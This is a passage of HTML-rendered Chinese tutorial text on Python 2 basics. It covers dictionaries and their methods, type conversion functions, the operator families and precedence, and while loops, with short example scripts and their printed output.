&#123;&#125;</span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>] = <span class="string">&quot;This is one&quot;</span></span><br><span class="line"><span class="built_in">dict</span>[<span class="number">2</span>] = <span class="string">&quot;This is two&quot;</span></span><br><span class="line"> </span><br><span class="line">tinydict = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;runoob&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:<span class="number">6734</span>, <span class="string">&#x27;dept&#x27;</span>: <span class="string">&#x27;sales&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>]          <span class="comment"># 输出键为&#x27;one&#x27; 的值</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dict</span>[<span class="number">2</span>]              <span class="comment"># 输出键为 2 的值</span></span><br><span class="line"><span class="built_in">print</span> tinydict             <span class="comment"># 输出完整的字典</span></span><br><span class="line"><span class="built_in">print</span> tinydict.keys()      <span class="comment"># 输出所有键</span></span><br><span class="line"><span class="built_in">print</span> tinydict.values()    <span class="comment"># 输出所有值</span></span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This <span class="keyword">is</span> one</span><br><span class="line">This <span class="keyword">is</span> two</span><br><span class="line">&#123;<span class="string">&#x27;dept&#x27;</span>: <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">6734</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;runoob&#x27;</span>&#125;</span><br><span class="line">[<span class="string">&#x27;dept&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;sales&#x27;</span>, <span class="number">6734</span>, <span class="string">&#x27;runoob&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h4><p>向字典添加新内容的方法是增加新的键&#x2F;值对，修改或删除已有键&#x2F;值对</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">tinydict = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Zara&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">tinydict[<span class="string">&#x27;Age&#x27;</span>] = <span class="number">8</span> <span class="comment"># 更新</span></span><br><span class="line">tinydict[<span class="string">&#x27;School&#x27;</span>] = <span class="string">&quot;PYTHON&quot;</span> <span class="comment"># 添加</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tinydict[&#x27;Age&#x27;]: &quot;</span>, tinydict[<span class="string">&#x27;Age&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tinydict[&#x27;School&#x27;]: &quot;</span>, tinydict[<span class="string">&#x27;School&#x27;</span>]</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tinydict[&#x27;Age&#x27;]:  8</span><br><span class="line">tinydict[&#x27;School&#x27;]:  PYTHON</span><br></pre></td></tr></table></figure><h4 id="删除字典元素"><a href="#删除字典元素" class="headerlink" title="删除字典元素"></a>删除字典元素</h4><p>能删单一的元素也能清空字典，清空只需一项操作。</p><p>显示删除一个字典用del命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">tinydict = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Zara&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> tinydict[<span class="string">&#x27;Name&#x27;</span>]  <span class="comment"># 删除键是&#x27;Name&#x27;的条目</span></span><br><span class="line">tinydict.clear()      <span class="comment"># 清空字典所有条目</span></span><br><span class="line"><span class="keyword">del</span> tinydict          <span class="comment"># 删除字典</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tinydict[&#x27;Age&#x27;]: &quot;</span>, tinydict[<span class="string">&#x27;Age&#x27;</span>] </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tinydict[&#x27;School&#x27;]: &quot;</span>, tinydict[<span class="string">&#x27;School&#x27;</span>]</span><br></pre></td></tr></table></figure><p>但这会引发一个异常，因为用del后字典不再存在。</p><h5 id="字典键的特性"><a href="#字典键的特性" class="headerlink" title="字典键的特性"></a>字典键的特性</h5><ul><li>不允许同一个键出现两次。创建时如果同一个键被赋值两次，最后的一个键值对会替换前面的。</li><li>键必须不可变，所以可以用数字，字符串或元组充当，列表则不行。</li></ul><h4 id="字典内置函数-方法"><a href="#字典内置函数-方法" class="headerlink" title="字典内置函数&amp;方法"></a>字典内置函数&amp;方法</h4><h5 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h5><table><thead><tr><th>1</th><th>cmp(dict1, dict2) 比较两个字典元素。</th></tr></thead><tbody><tr><td>2</td><td>len(dict) 计算字典元素个数，即键的总数。</td></tr><tr><td>3</td><td>str(dict) 输出字典可打印的字符串表示。</td></tr><tr><td>4</td><td>type(variable) 返回输入的变量类型，如果变量是字典就返回字典类型。</td></tr></tbody></table><h5 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a>内置方法</h5><table><thead><tr><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python/att-dictionary-clear.html">dict.clear()</a> 删除字典内所有元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-dictionary-copy.html">dict.copy()</a> 返回一个字典的浅复制</td></tr><tr><td align="left">[dict.fromkeys(seq<a href="https://www.runoob.com/python/att-dictionary-fromkeys.html">, val])</a> 创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-dictionary-get.html">dict.get(key, default&#x3D;None)</a> 返回指定键的值，如果值不在字典中返回default值</td></tr><tr><td align="left"></td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-dictionary-items.html">dict.items()</a> 以列表返回可遍历的(键, 值) 元组数组</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-dictionary-keys.html">dict.keys()</a> 以列表返回一个字典所有的键</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-dictionary-setdefault.html">dict.setdefault(key, default&#x3D;None)</a> 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-dictionary-update.html">dict.update(dict2)</a> 把字典dict2的键&#x2F;值对更新到dict里</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/att-dictionary-values.html">dict.values()</a> 以列表返回字典中的所有值</td></tr><tr><td align="left">[pop(key<a href="https://www.runoob.com/python/python-att-dictionary-pop.html">,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python/python-att-dictionary-popitem.html">popitem()</a> 返回并删除字典中的最后一对键和值。</td></tr></tbody></table><h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">int(x [,base])</td><td align="left">将x转换为一个整数</td></tr><tr><td align="left">long(x [,base] )</td><td align="left">将x转换为一个长整数</td></tr><tr><td align="left">float(x)]</td><td align="left">将x转换到一个浮点数</td></tr><tr><td align="left">complex(real [,imag])</td><td align="left">创建一个复数</td></tr><tr><td align="left">str(x)</td><td align="left">将对象 x 转换为字符串</td></tr><tr><td align="left">repr(x)</td><td align="left">将对象 x 转换为表达式字符串</td></tr><tr><td align="left">eval(str)</td><td align="left">用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td align="left">tuple(s)</td><td align="left">将序列 s 转换为一个元组</td></tr><tr><td align="left">list(s)</td><td align="left">将序列 s 转换为一个列表</td></tr><tr><td align="left">set(s)</td><td align="left">转换为可变集合</td></tr><tr><td align="left">dict(d)</td><td align="left">创建一个字典。d 必须是一个序列 (key,value)元组。</td></tr><tr><td align="left">frozenset(s)</td><td align="left">转换为不可变集合</td></tr><tr><td align="left">chr(x)</td><td align="left">将一个整数转换为一个字符</td></tr><tr><td align="left">unichr(x)</td><td align="left">将一个整数转换为Unicode字符</td></tr><tr><td align="left">ord(x)</td><td align="left">将一个字符转换为它的整数值</td></tr><tr><td align="left">hex(x)</td><td align="left">将一个整数转换为一个十六进制字符串</td></tr><tr><td align="left">oct(x)</td><td align="left">将一个整数转换为一个八进制字符串</td></tr></tbody></table><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>整数除整数，只能得出整数。如果要得到小数部分，把其中一个数改成浮点数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span>/<span class="number">2</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1.0</span>/<span class="number">2</span></span><br><span class="line"><span class="number">0.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span>/<span class="built_in">float</span>(<span class="number">2</span>)</span><br><span class="line"><span class="number">0.5</span></span><br></pre></td></tr></table></figure><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">a = <span class="number">21</span></span><br><span class="line">b = <span class="number">10</span></span><br><span class="line">c = <span class="number">0</span> </span><br><span class="line">c = a + b</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;1 - c 的值为：&quot;</span>, c </span><br><span class="line">c += a</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;2 - c 的值为：&quot;</span>, c  </span><br><span class="line">c *= a</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;3 - c 的值为：&quot;</span>, c  </span><br><span class="line">c /= a </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;4 - c 的值为：&quot;</span>, c  </span><br><span class="line">c = <span class="number">2</span></span><br><span class="line">c %= a</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;5 - c 的值为：&quot;</span>, c </span><br><span class="line">c **= a</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;6 - c 的值为：&quot;</span>, c </span><br><span class="line">c //= a</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;7 - c 的值为：&quot;</span>, c</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> - c 的值为： <span class="number">31</span></span><br><span class="line"><span class="number">2</span> - c 的值为： <span class="number">52</span></span><br><span class="line"><span class="number">3</span> - c 的值为： <span class="number">1092</span></span><br><span class="line"><span class="number">4</span> - c 的值为： <span class="number">52</span></span><br><span class="line"><span class="number">5</span> - c 的值为： <span class="number">2</span></span><br><span class="line"><span class="number">6</span> - c 的值为： <span class="number">2097152</span></span><br><span class="line"><span class="number">7</span> - c 的值为： <span class="number">99864</span></span><br></pre></td></tr></table></figure><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><p>按位运算符是把数字看作二进制来进行计算的。按位运算法则如下：</p><p>下表中变量 a 为 60，b 为 13，二进制格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = 0011 <span class="number">1100</span></span><br><span class="line">b = <span class="number">0000</span> <span class="number">1101</span></span><br><span class="line">-----------------</span><br><span class="line">a&amp;b = <span class="number">0000</span> <span class="number">1100</span></span><br><span class="line">a|b = 0011 <span class="number">1101</span></span><br><span class="line">a^b = 0011 0001</span><br><span class="line">~a  = <span class="number">1100</span> 0011</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">&amp;</td><td align="left">按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0</td><td align="left">(a &amp; b) 输出结果 12 ，二进制解释： 0000 1100</td></tr><tr><td align="left">|</td><td align="left">按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。</td><td align="left">(a | b) 输出结果 61 ，二进制解释： 0011 1101</td></tr><tr><td align="left">^</td><td align="left">按位异或运算符：当两对应的二进位相异时，结果为1</td><td align="left">(a ^ b) 输出结果 49 ，二进制解释： 0011 0001</td></tr><tr><td align="left">~</td><td align="left">按位取反运算符：将二进制表示中的每一位取反，0 变为 1，1 变为 0。**~x** 类似于 <strong>-x-1</strong></td><td align="left">(~a ) 输出结果 -61 ，二进制解释： 1100 0011 (以补码形式表示)，在一个有符号二进制数的补码形式。</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">左移动运算符：运算数的各二进位全部左移若干位，由 <strong>&lt;&lt;</strong> 右边的数字指定了移动的位数，高位丢弃，低位补0。</td><td align="left">a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">右移动运算符：把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，**&gt;&gt;** 右边的数字指定了移动的位数</td><td align="left">a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111</td></tr></tbody></table><p>以下实例演示了Python所有位运算符的操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">a = <span class="number">60</span>            <span class="comment"># 60 = 0011 1100 </span></span><br><span class="line">b = <span class="number">13</span>            <span class="comment"># 13 = 0000 1101 </span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line">c = a &amp; b;        <span class="comment"># 12 = 0000 1100</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;1 - c 的值为：&quot;</span>, c</span><br><span class="line">c = a | b;        <span class="comment"># 61 = 0011 1101 </span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;2 - c 的值为：&quot;</span>, </span><br><span class="line">c = a ^ b;        <span class="comment"># 49 = 0011 0001</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;3 - c 的值为：&quot;</span>, c</span><br><span class="line">c = ~a;           <span class="comment"># -61 = 1100 0011</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;4 - c 的值为：&quot;</span>, c</span><br><span class="line">c = a &lt;&lt; <span class="number">2</span>;       <span class="comment"># 240 = 1111 0000</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;5 - c 的值为：&quot;</span>, c</span><br><span class="line">c = a &gt;&gt; <span class="number">2</span>;       <span class="comment"># 15 = 0000 1111</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;6 - c 的值为：&quot;</span>, c</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> - c 的值为： <span class="number">12</span></span><br><span class="line"><span class="number">2</span> - c 的值为： <span class="number">61</span></span><br><span class="line"><span class="number">3</span> - c 的值为： <span class="number">49</span></span><br><span class="line"><span class="number">4</span> - c 的值为： -<span class="number">61</span></span><br><span class="line"><span class="number">5</span> - c 的值为： <span class="number">240</span></span><br><span class="line"><span class="number">6</span> - c 的值为： <span class="number">15</span></span><br></pre></td></tr></table></figure><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th align="left">运算符</th><th align="left">逻辑表达式</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">and</td><td align="left">x and y</td><td align="left">布尔”与” - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。</td><td align="left">(a and b) 返回 20。</td></tr><tr><td align="left">or</td><td align="left">x or y</td><td align="left">布尔”或” - 如果 x 是非 0，它返回 x 的计算值，否则它返回 y 的计算值。</td><td align="left">(a or b) 返回 10。</td></tr><tr><td align="left">not</td><td align="left">not x</td><td align="left">布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td><td align="left">not(a and b) 返回 False</td></tr></tbody></table><h3 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h3><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">in</td><td align="left">如果在指定的序列中找到值返回 True，否则返回 False。</td><td align="left">x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td></tr><tr><td align="left">not in</td><td align="left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td><td align="left">x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">20</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( a <span class="keyword">in</span> <span class="built_in">list</span> ):</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;1 - 变量 a 在给定的列表中 list 中&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;1 - 变量 a 不在给定的列表中 list 中&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ( b <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">list</span> ):</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;2 - 变量 b 不在给定的列表中 list 中&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;2 - 变量 b 在给定的列表中 list 中&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 修改变量 a 的值</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> ( a <span class="keyword">in</span> <span class="built_in">list</span> ):</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;3 - 变量 a 在给定的列表中 list 中&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;3 - 变量 a 不在给定的列表中 list 中&quot;</span></span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> - 变量 a 不在给定的列表中 <span class="built_in">list</span> 中</span><br><span class="line"><span class="number">2</span> - 变量 b 不在给定的列表中 <span class="built_in">list</span> 中</span><br><span class="line"><span class="number">3</span> - 变量 a 在给定的列表中 <span class="built_in">list</span> 中</span><br></pre></td></tr></table></figure><h3 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h3><p>身份运算符用于比较两个对象的存储单元</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">is</td><td align="left">is 是判断两个标识符是不是引用自一个对象</td><td align="left"><strong>x is y</strong>, 类似 <strong>id(x) &#x3D;&#x3D; id(y)</strong> , 如果引用的是同一个对象则返回 True，否则返回 False</td></tr><tr><td align="left">is not</td><td align="left">is not 是判断两个标识符是不是引用自不同对象</td><td align="left"><strong>x is not y</strong> ， 类似 **id(a) !&#x3D; id(b)**。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td></tr></tbody></table><p><strong>注：</strong> <a href="https://www.runoob.com/python/python-func-id.html">id()</a> 函数用于获取对象内存地址。</p><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p>从最高到最低优先级的所有运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">**</td><td align="left">指数 (最高优先级)</td></tr><tr><td align="left">~ + -</td><td align="left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td></tr><tr><td align="left">* &#x2F; % &#x2F;&#x2F;</td><td align="left">乘，除，取模和取整除</td></tr><tr><td align="left">+ -</td><td align="left">加法减法</td></tr><tr><td align="left">&gt;&gt; &lt;&lt;</td><td align="left">右移，左移运算符</td></tr><tr><td align="left">&amp;</td><td align="left">位 ‘AND’</td></tr><tr><td align="left">^ |</td><td align="left">位运算符</td></tr><tr><td align="left">&lt;&#x3D; &lt; &gt; &gt;&#x3D;</td><td align="left">比较运算符</td></tr><tr><td align="left">&lt;&gt; &#x3D;&#x3D; !&#x3D;</td><td align="left">等于运算符</td></tr><tr><td align="left">&#x3D; %&#x3D; &#x2F;&#x3D; &#x2F;&#x2F;&#x3D; -&#x3D; +&#x3D; *&#x3D; **&#x3D;</td><td align="left">赋值运算符</td></tr><tr><td align="left">is is not</td><td align="left">身份运算符</td></tr><tr><td align="left">in not in</td><td align="left">成员运算符</td></tr><tr><td align="left">not and or</td><td align="left">逻辑运算符</td></tr></tbody></table><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><p>Python 提供了 for 循环和 while 循环（在 Python 中没有 do..while 循环）:</p><table><thead><tr><th align="left">循环类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">while 循环</td><td align="left">在给定的判断条件为 true 时执行循环体，否则退出循环体。</td></tr><tr><td align="left">for 循环</td><td align="left">重复执行语句</td></tr><tr><td align="left">嵌套循环</td><td align="left">可以在while循环体中嵌套for循环</td></tr></tbody></table><h3 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h3><p>循环控制语句可以更改语句执行的顺序。Python支持以下循环控制语句：</p><table><thead><tr><th align="left">控制语句</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">break 语句</td><td align="left">在语句块执行过程中终止循环，并且跳出整个循环</td></tr><tr><td align="left">continue 语句</td><td align="left">在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。</td></tr><tr><td align="left">pass 语句</td><td align="left">pass是空语句，是为了保持程序结构的完整性。</td></tr></tbody></table><h4 id="While循环语句"><a href="#While循环语句" class="headerlink" title="While循环语句"></a>While循环语句</h4><h5 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">var = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> var == <span class="number">1</span> :  <span class="comment"># 该条件永远为true，循环将无限执行下去</span></span><br><span class="line">   num = raw_input(<span class="string">&quot;Enter a number  :&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;You entered: &quot;</span>, num</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Enter a number  :<span class="number">20</span></span><br><span class="line">You entered:  <span class="number">20</span></span><br><span class="line">Enter a number  :<span class="number">29</span></span><br><span class="line">You entered:  <span class="number">29</span></span><br><span class="line">Enter a number  :<span class="number">3</span></span><br><span class="line">You entered:  <span class="number">3</span></span><br><span class="line">Enter a number between :Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    num = raw_input(<span class="string">&quot;Enter a number :&quot;</span>)</span><br><span class="line">KeyboardInterrupt</span><br></pre></td></tr></table></figure><p>以上的无限循环可以使用 CTRL+C 来中断循环。</p><h5 id="循环使用-else-语句"><a href="#循环使用-else-语句" class="headerlink" title="循环使用 else 语句"></a>循环使用 else 语句</h5><p>while … else 在循环条件为 false 时执行 else 语句块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">   <span class="built_in">print</span> count, <span class="string">&quot; is  less than 5&quot;</span></span><br><span class="line">   count = count + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> count, <span class="string">&quot; is not less than 5&quot;</span></span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">is</span> less than <span class="number">5</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> less than <span class="number">5</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">is</span> less than <span class="number">5</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">is</span> less than <span class="number">5</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">is</span> less than <span 